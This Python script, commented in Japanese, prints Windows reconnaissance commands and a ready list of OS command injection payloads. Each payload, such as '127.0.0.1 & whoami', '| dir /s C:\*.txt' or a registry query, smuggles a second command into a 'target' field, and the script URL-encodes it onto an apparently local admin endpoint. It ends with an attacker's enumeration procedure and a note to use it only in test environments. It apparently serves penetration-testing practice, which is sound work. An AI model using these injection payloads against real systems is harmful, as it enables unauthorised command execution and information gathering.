#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Windows環境で動作する実用的なOSコマンド一覧
"""

import urllib.parse
import platform

def display_working_commands():
    print("🖥️ Windows環境で動作するOSコマンド一覧")
    print("=" * 60)
    
    os_type = platform.system()
    print(f"現在のOS: {os_type}")
    print(f"プラットフォーム: {platform.platform()}")
    
    base_url = "http://localhost:5000/admin/system?target="
    
    print("\n✅ Windows環境で確実に動作するコマンド:")
    print("=" * 50)
    
    windows_commands = {
        "📁 ファイル・ディレクトリ操作": [
            ("dir", "現在のディレクトリ一覧"),
            ("dir C:\\", "Cドライブのルート一覧"),
            ("dir /s C:\\Users", "Usersフォルダの再帰検索"),
            ("type nul", "空ファイル作成テスト"),
            ("echo %CD%", "現在のディレクトリパス"),
            ("tree /F", "ディレクトリツリー表示")
        ],
        
        "👤 ユーザー・システム情報": [
            ("whoami", "現在のユーザー名"),
            ("hostname", "コンピュータ名"),
            ("systeminfo", "詳細なシステム情報"),
            ("ver", "Windowsバージョン"),
            ("date /t", "現在の日付"),
            ("time /t", "現在の時刻"),
            ("echo %USERNAME%", "ユーザー名環境変数"),
            ("echo %COMPUTERNAME%", "コンピュータ名環境変数"),
            ("echo %OS%", "OS情報")
        ],
        
        "🔍 プロセス・サービス": [
            ("tasklist", "実行中のプロセス一覧"),
            ("tasklist /svc", "サービス付きプロセス一覧"),
            ("wmic process list brief", "プロセス詳細情報"),
            ("wmic service list brief", "サービス一覧"),
            ("sc query", "サービス状態確認")
        ],
        
        "🌐 ネットワーク": [
            ("ping localhost", "ローカルホストへのPing"),
            ("ping -n 2 8.8.8.8", "GoogleDNSへのPing"),
            ("nslookup google.com", "DNS検索"),
            ("ipconfig", "ネットワーク設定"),
            ("ipconfig /all", "詳細ネットワーク情報"),
            ("arp -a", "ARPテーブル"),
            ("netstat -an", "ネットワーク接続状況")
        ],
        
        "💾 ハードウェア・ディスク": [
            ("wmic diskdrive list brief", "ディスクドライブ情報"),
            ("wmic logicaldisk list brief", "論理ディスク情報"),
            ("fsutil fsinfo drives", "利用可能ドライブ"),
            ("vol C:", "ボリューム情報")
        ]
    }
    
    for category, commands in windows_commands.items():
        print(f"\n{category}")
        print("-" * 30)
        for i, (cmd, desc) in enumerate(commands, 1):
            print(f"{i:2d}. {cmd:<25} - {desc}")
    
    print("\n🎯 実用的な攻撃ペイロード例:")
    print("=" * 50)
    
    practical_payloads = [
        {
            "name": "基本情報収集",
            "payload": "127.0.0.1 & whoami",
            "description": "現在のユーザー名を取得"
        },
        {
            "name": "システム情報取得", 
            "payload": "localhost; systeminfo",
            "description": "詳細なシステム情報を収集"
        },
        {
            "name": "ディレクトリ探索",
            "payload": "8.8.8.8 && dir C:\\",
            "description": "Cドライブの内容を一覧表示"
        },
        {
            "name": "プロセス監視",
            "payload": "google.com | tasklist",
            "description": "実行中のプロセス一覧を取得"
        },
        {
            "name": "ネットワーク調査",
            "payload": "127.0.0.1 & ipconfig /all",
            "description": "ネットワーク設定の詳細を取得"
        },
        {
            "name": "環境変数確認",
            "payload": "localhost; echo %PATH%",
            "description": "PATH環境変数を表示"
        },
        {
            "name": "サービス確認",
            "payload": "8.8.8.8 && sc query",
            "description": "Windowsサービスの状態確認"
        },
        {
            "name": "複数コマンド実行",
            "payload": "127.0.0.1 & whoami & hostname & date /t",
            "description": "複数の情報を一度に取得"
        }
    ]
    
    for i, attack in enumerate(practical_payloads, 1):
        print(f"\n{i}. 🎯 {attack['name']}")
        print(f"   ペイロード: {attack['payload']}")
        print(f"   説明: {attack['description']}")
        
        # URLエンコード
        encoded = urllib.parse.quote(attack['payload'])
        print(f"   URL: {base_url}{encoded}")
    
    print("\n🔧 高度な情報収集テクニック:")
    print("=" * 50)
    
    advanced_techniques = [
        {
            "technique": "ユーザー情報詳細",
            "payload": "127.0.0.1 & whoami /all",
            "info": "権限とグループ情報も含む詳細なユーザー情報"
        },
        {
            "technique": "インストール済みソフト",
            "payload": "localhost; wmic product get name,version",
            "info": "インストール済みソフトウェア一覧"
        },
        {
            "technique": "起動時間確認",
            "payload": "8.8.8.8 && wmic os get lastbootuptime",
            "info": "システムの最終起動時間"
        },
        {
            "technique": "ファイル検索",
            "payload": "127.0.0.1 | dir /s C:\\*.txt",
            "info": "Cドライブ内のすべてのtxtファイル検索"
        },
        {
            "technique": "レジストリ情報",
            "payload": "localhost & reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
            "info": "Windowsバージョン情報をレジストリから取得"
        }
    ]
    
    for i, tech in enumerate(advanced_techniques, 1):
        print(f"\n{i}. 🔬 {tech['technique']}")
        print(f"   ペイロード: {tech['payload']}")
        print(f"   取得情報: {tech['info']}")
        encoded = urllib.parse.quote(tech['payload'])
        print(f"   URL: {base_url}{encoded}")
    
    print("\n⚠️ 注意事項:")
    print("=" * 50)
    warnings = [
        "• 一部のコマンドは管理者権限が必要な場合があります",
        "• ネットワークコマンドは環境によって結果が異なります", 
        "• WMICコマンドは時間がかかる場合があります",
        "• 大量の出力が返される場合があります",
        "• テスト環境でのみ使用してください"
    ]
    
    for warning in warnings:
        print(warning)
    
    print("\n💡 効率的な調査手順:")
    print("=" * 50)
    procedure = [
        "1. 基本情報: whoami, hostname, systeminfo",
        "2. 権限確認: whoami /all",
        "3. ネットワーク: ipconfig, netstat -an",
        "4. プロセス: tasklist, wmic process list",
        "5. ファイル探索: dir /s C:\\*.log, dir /s C:\\*.txt",
        "6. サービス: sc query, wmic service list"
    ]
    
    for step in procedure:
        print(step)

if __name__ == "__main__":
    display_working_commands()